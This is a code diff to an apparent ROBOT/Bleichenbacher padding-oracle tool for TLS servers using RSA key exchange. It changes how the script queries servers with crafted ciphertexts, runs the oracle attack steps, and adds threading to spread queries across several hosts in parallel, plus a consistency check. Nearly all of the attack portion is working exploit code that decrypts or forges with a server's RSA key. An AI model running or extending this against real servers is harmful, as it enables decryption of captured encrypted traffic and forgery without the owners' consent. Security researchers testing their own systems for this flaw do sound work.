@@ -14,6 +14,7 @@ import os
 import argparse
 import ssl
 import gmpy2
+import threading
 from cryptography import x509
 from cryptography.hazmat.backends import default_backend
 
@@ -54,7 +55,7 @@ def get_rsa_from_server(server, port):
             print("Server does not seem to allow connections with TLS_RSA (this is ideal).")
         if args.csv:
             # TODO: We could add an extra check that the server speaks TLS without RSA
-            print("NORSA,%s,%s,,,,,,,," % (args.host, ip))
+            print("NORSA,%s,%s,,,,,,,," % (args.host, ips[0]))
         s.close()
         quit()
     except (ConnectionRefusedError, socket.timeout) as e:
@@ -62,20 +63,20 @@ def get_rsa_from_server(server, port):
             print("Cannot connect to server: %s" % e)
             print("There seems to be no TLS on this host/port.")
         if args.csv:
-            print("NOTLS,%s,%s,,,,,,,," % (args.host, ip))
+            print("NOTLS,%s,%s,,,,,,,," % (args.host, ips[0]))
         quit()
 
 
-def oracle(pms, messageflow=False):
+def oracle(pms, target_ip, target_port, messageflow=False):
     global cke_version
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
         if not enable_fastopen:
-            s.connect((ip, args.port))
+            s.connect((target_ip, target_port))
             s.sendall(ch)
         else:
-            s.sendto(ch, MSG_FASTOPEN, (ip, args.port))
+            s.sendto(ch, MSG_FASTOPEN, (target_ip, target_port))
         s.settimeout(timeout)
         buf = bytearray.fromhex("")
         i = 0
@@ -132,18 +133,24 @@ def oracle(pms, messageflow=False):
         return str(e)
 
 
-def BleichenbacherOracle(cc):
+count_lock = threading.Lock()
+
+def BleichenbacherOracle(cc, target_ip, target_port):
     global count
     global countvalid
+    global count_lock
+
+    count_lock.acquire()
     count = count + 1
-    if count % 1000 == 0:
+    if count % 100 == 0:
         print(count, "oracle queries")
+    count_lock.release()
     tmp = hex(cc).rstrip("L").lstrip("0x").rjust(modulus_bits // 4, '0')
     pms = bytearray.fromhex(tmp)
-    o = oracle(pms, messageflow=flow)
+    o = oracle(pms, target_ip, target_port, messageflow=flow)
     if o == oracle_good:
         # Query the oracle again to make sure it is real...
-        o = oracle(pms, messageflow=flow)
+        o = oracle(pms, target_ip, target_port, messageflow=flow)
         if o == oracle_good:
             countvalid += 1
             return True
@@ -184,8 +191,12 @@ else:
 # We only enable TCP fast open if the Linux proc interface exists
 enable_fastopen = os.path.exists("/proc/sys/net/ipv4/tcp_fastopen")
 
+ips = list()
+
 try:
-    ip = socket.gethostbyname(args.host)
+    ip_list = args.host.split(' ')
+    for domain in ip_list:
+      ips.append(socket.gethostbyname(domain))
 except socket.gaierror as e:
     if not args.quiet:
         print("Cannot resolve host: %s" % e)
@@ -196,9 +207,9 @@ except socket.gaierror as e:
 
 
 if not args.quiet:
-    print("Scanning host %s ip %s port %i" % (args.host, ip, args.port))
+    print("Scanning host %s ip %s port %i" % (args.host, ips[0], args.port))
 
-N, e = get_rsa_from_server(ip, args.port)
+N, e = get_rsa_from_server(ips[0], args.port)
 modulus_bits = int(math.ceil(math.log(N, 2)))
 modulus_bytes = (modulus_bits + 7) // 8
 if not args.quiet:
@@ -229,26 +240,26 @@ pms_bad3 = int(gmpy2.powmod(pms_bad_in3, e, N)).to_bytes(modulus_bytes, byteorde
 pms_bad4 = int(gmpy2.powmod(pms_bad_in4, e, N)).to_bytes(modulus_bytes, byteorder="big")
 
 
-oracle_good = oracle(pms_good, messageflow=False)
-oracle_bad1 = oracle(pms_bad1, messageflow=False)
-oracle_bad2 = oracle(pms_bad2, messageflow=False)
-oracle_bad3 = oracle(pms_bad3, messageflow=False)
-oracle_bad4 = oracle(pms_bad4, messageflow=False)
+oracle_good = oracle(pms_good, ips[0], args.port, messageflow=False)
+oracle_bad1 = oracle(pms_bad1, ips[0], args.port, messageflow=False)
+oracle_bad2 = oracle(pms_bad2, ips[0], args.port, messageflow=False)
+oracle_bad3 = oracle(pms_bad3, ips[0], args.port, messageflow=False)
+oracle_bad4 = oracle(pms_bad4, ips[0], args.port, messageflow=False)
 
 if (oracle_good == oracle_bad1 == oracle_bad2 == oracle_bad3 == oracle_bad4):
     if not args.quiet:
         print("Identical results (%s), retrying with changed messageflow" % oracle_good)
-    oracle_good = oracle(pms_good, messageflow=True)
-    oracle_bad1 = oracle(pms_bad1, messageflow=True)
-    oracle_bad2 = oracle(pms_bad2, messageflow=True)
-    oracle_bad3 = oracle(pms_bad3, messageflow=True)
-    oracle_bad4 = oracle(pms_bad4, messageflow=True)
+    oracle_good = oracle(pms_good, ips[0], args.port, messageflow=True)
+    oracle_bad1 = oracle(pms_bad1, ips[0], args.port, messageflow=True)
+    oracle_bad2 = oracle(pms_bad2, ips[0], args.port, messageflow=True)
+    oracle_bad3 = oracle(pms_bad3, ips[0], args.port, messageflow=True)
+    oracle_bad4 = oracle(pms_bad4, ips[0], args.port, messageflow=True)
     if (oracle_good == oracle_bad1 == oracle_bad2 == oracle_bad3 == oracle_bad4):
         if not args.quiet:
             print("Identical results (%s), no working oracle found" % oracle_good)
             print("NOT VULNERABLE!")
         if args.csv:
-            print("SAFE,%s,%s,,,,%s,%s,%s,%s,%s" % (args.host, ip, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
+            print("SAFE,%s,%s,,,,%s,%s,%s,%s,%s" % (args.host, ips[0], oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
         sys.exit(1)
     else:
         flow = True
@@ -256,18 +267,47 @@ else:
     flow = False
 
 # Re-checking all oracles to avoid unreliable results
-oracle_good_verify = oracle(pms_good, messageflow=flow)
-oracle_bad_verify1 = oracle(pms_bad1, messageflow=flow)
-oracle_bad_verify2 = oracle(pms_bad2, messageflow=flow)
-oracle_bad_verify3 = oracle(pms_bad3, messageflow=flow)
-oracle_bad_verify4 = oracle(pms_bad4, messageflow=flow)
+oracle_good_verify = oracle(pms_good, ips[0], args.port, messageflow=flow)
+oracle_bad_verify1 = oracle(pms_bad1, ips[0], args.port, messageflow=flow)
+oracle_bad_verify2 = oracle(pms_bad2, ips[0], args.port, messageflow=flow)
+oracle_bad_verify3 = oracle(pms_bad3, ips[0], args.port, messageflow=flow)
+oracle_bad_verify4 = oracle(pms_bad4, ips[0], args.port, messageflow=flow)
 
 if (oracle_good != oracle_good_verify) or (oracle_bad1 != oracle_bad_verify1) or (oracle_bad2 != oracle_bad_verify2) or (oracle_bad3 != oracle_bad_verify3) or (oracle_bad4 != oracle_bad_verify4):
     if not args.quiet:
         print("Getting inconsistent results, aborting.")
     if args.csv:
-        print("INCONSISTENT,%s,%s,,,,%s,%s,%s,%s,%s" % (args.host, ip, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
+        print("INCONSISTENT,%s,%s,,,,%s,%s,%s,%s,%s" % (args.host, ips[0], oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
     quit()
+
+print("Checking error consistency")
+for i in range(9):
+    rnd_pms_check = str(i + 1)*2 + rnd_pms[2:len(rnd_pms)]
+    pms_good_in = int("0002" + rnd_pad + "00" + "0303" + rnd_pms_check, 16)
+    # wrong first two bytes
+    pms_bad_in1 = int("4117" + rnd_pad + "00" + "0303" + rnd_pms_check, 16)
+    # 0x00 on a wrong position, also trigger older JSSE bug
+    pms_bad_in2 = int("0002" + rnd_pad + "11" + rnd_pms_check + "0011", 16)
+    # no 0x00 in the middle
+    pms_bad_in3 = int("0002" + rnd_pad + "11" + "1111" + rnd_pms_check, 16)
+    # wrong version number (according to Klima / Pokorny / Rosa paper)
+    pms_bad_in4 = int("0002" + rnd_pad + "00" + "0202" + rnd_pms_check, 16)
+
+    pms_good = int(gmpy2.powmod(pms_good_in, e, N)).to_bytes(modulus_bytes, byteorder="big")
+    pms_bad1 = int(gmpy2.powmod(pms_bad_in1, e, N)).to_bytes(modulus_bytes, byteorder="big")
+    pms_bad2 = int(gmpy2.powmod(pms_bad_in2, e, N)).to_bytes(modulus_bytes, byteorder="big")
+    pms_bad3 = int(gmpy2.powmod(pms_bad_in3, e, N)).to_bytes(modulus_bytes, byteorder="big")
+    pms_bad4 = int(gmpy2.powmod(pms_bad_in4, e, N)).to_bytes(modulus_bytes, byteorder="big")
+
+    oracle_good_check = oracle(pms_good, ips[0], args.port, messageflow=False)
+    oracle_bad1_check = oracle(pms_bad1, ips[0], args.port, messageflow=False)
+    oracle_bad2_check = oracle(pms_bad2, ips[0], args.port, messageflow=False)
+    oracle_bad3_check = oracle(pms_bad3, ips[0], args.port, messageflow=False)
+    oracle_bad4_check = oracle(pms_bad4, ips[0], args.port, messageflow=False)
+
+    if (oracle_good != oracle_good_check) or (oracle_bad1 != oracle_bad1_check) or (oracle_bad2 != oracle_bad2_check) or (oracle_bad3 != oracle_bad3_check) or (oracle_bad4 != oracle_bad4_check):
+        print("Oracle returns incosistent errors, false positive detected")
+        quit()
 
 # If the response to the invalid PKCS#1 request (oracle_bad1) is equal to both
 # requests starting with 0002, we have a weak oracle. This is because the only
@@ -300,9 +340,9 @@ else:
     tlsver = "TLS raw version %i/%i" % (cke_version[0], cke_version[1])
 
 if args.csv:
-    print("VULNERABLE,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s" % (args.host, ip, tlsver, oracle_strength, flowt, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
+    print("VULNERABLE,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s" % (args.host, ips[0], tlsver, oracle_strength, flowt, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
 else:
-    print("VULNERABLE! Oracle (%s) found on %s/%s, %s, %s message flow: %s/%s (%s / %s / %s)" % (oracle_strength, args.host, ip, tlsver, flowt, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
+    print("VULNERABLE! Oracle (%s) found on %s/%s, %s, %s message flow: %s/%s (%s / %s / %s)" % (oracle_strength, args.host, ips[0], tlsver, flowt, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
 
 if not args.quiet:
     print("Result of good request:                        %s" % oracle_good)
@@ -329,6 +369,20 @@ else:
     C = int("0001" + "ff" * (modulus_bytes - len(msg) - 3) + "00" + "".join("{:02x}".format(ord(c)) for c in msg), 16)
 
 
+class ThreadWithReturnValue(threading.Thread):
+    def __init__(self, group=None, target=None, name=None,
+                 args=(), kwargs={}, Verbose=None):
+        threading.Thread.__init__(self, group, target, name, args, kwargs)
+        self._return = None
+    def run(self):
+        if self._target is not None:
+            self._return = self._target(*self._args,
+                                                **self._kwargs)
+    def join(self, *args):
+        threading.Thread.join(self, *args)
+        return self._return
+
+
 ################################################################################
 # define Bleichenbacher Oracle
 count = 0
@@ -347,14 +401,31 @@ c0 = C
 # Step 1: Blinding
 print("Searching for the first valid ciphertext starting %i" % s0)
 if (EXECUTE_BLINDING):
-    while not BleichenbacherOracle(c0):
-        s0 = s0 + 1
-        c0 = (int(gmpy2.powmod(s0, e, N)) * C) % N
-        if (limit != -1) and s0 > limit:
-            quit()
+    searching = True
+    while searching:
+        # Create threads for all hosts
+        threads = list()
+        s_vals = list()
+        for j in range(len(ips)):
+            s0 = s0 + 1
+            c0 = (int(gmpy2.powmod(s0, e, N)) * C) % N
+            s_vals.append((s0, c0))
+            if (limit != -1) and s0 > limit:
+                quit()
+            threads.append(
+                ThreadWithReturnValue(target=BleichenbacherOracle, args=(c0, ips[j], args.port))
+            )
+
+        for thread in threads:
+            thread.start()
+
+        for j in range(len(threads)):
+            result = threads[j].join()
+            if searching and result and s_vals[j][0] != 5 and s_vals[j][0] != 9:
+                searching = False
+                s0, c0 = s_vals[j]
+
     print(" -> Found s0: ", s0)
-
-
 M = set()
 M.add((a, b))
 Mnew = set()
@@ -366,33 +437,86 @@ while True:
     # find pairs r,s such that m*s % N = m*s-r*N is PKCS conforming
     # 2.a)
     if i == 1:
+        searching = True
         s = N // (3 * B)
         cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
-        while not BleichenbacherOracle(cc):
-            s += 1
-            cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
+        while searching:
+        # Create threads for all hosts
+            threads = list()
+            s_vals = list()
+            for j in range(len(ips)):
+                s += 1
+                s_vals.append(s)
+                cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
+                threads.append(
+                    ThreadWithReturnValue(target=BleichenbacherOracle, args=(cc, ips[j], args.port))
+                )
 
+            for thread in threads:
+                thread.start()
+
+            for j in range(len(threads)):
+                result = threads[j].join()
+                if searching and result:
+                    searching = False
+                    s = s_vals[j]
     # 2.b)
     if not i == 1 and len(M) >= 2:
+        searching = True
         s += 1
         cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
-        while not BleichenbacherOracle(cc):
-            s += 1
-            cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
+        while searching:
+        # Create threads for all hosts
+            threads = list()
+            s_vals = list()
+            for j in range(len(ips)):
+                s += 1
+                s_vals.append(s)
+                cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
+                threads.append(
+                    ThreadWithReturnValue(target=BleichenbacherOracle, args=(cc, ips[j], args.port))
+                )
+
+            for thread in threads:
+                thread.start()
+
+            for j in range(len(threads)):
+                result = threads[j].join()
+                if searching and result:
+                    searching = False
+                    s = s_vals[j]
 
     # 2.c)
     if not i == 1 and len(M) == 1:
+        searching = True
         a, b = M.pop()
         M.add((a, b))
         r = 2 * (b * s - 2 * B) // N
         s = -(-(2 * B + r * N // b))
         cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
-        while not BleichenbacherOracle(cc):
-            s += 1
-            if s > ((3 * B + r * N) // a):
-                r += 1
-                s = -(-(2 * B + r * N) // b)
-            cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
+        while searching:
+        # Create threads for all hosts
+            threads = list()
+            s_vals = list()
+            for j in range(len(ips)):
+                s += 1
+                if s > ((3 * B + r * N) // a):
+                    r += 1
+                    s = -(-(2 * B + r * N) // b)
+                s_vals.append((s, r))
+                cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
+                threads.append(
+                    ThreadWithReturnValue(target=BleichenbacherOracle, args=(cc, ips[j], args.port))
+                )
+
+            for thread in threads:
+                thread.start()
+
+            for j in range(len(threads)):
+                result = threads[j].join()
+                if searching and result:
+                    searching = False
+                    s, r = s_vals[j]
 
     # compute all possible r, depending on the known bounds on m.
     # Use that 2*B+r*N <= ms <= 3*B-1+r*N
@@ -442,7 +566,7 @@ print("Starting exhaustive search on remaining interval")
 print("min: ", hex(a))
 print("max: ", hex(b))
 
-while not c0 == int(gmpy2.powmod(a, e, N)):
+while not c0 == int(gmpy2.powmod(a, e, N)) and a <= b:
     a += 1
 
 print("C:      ", hex(C))
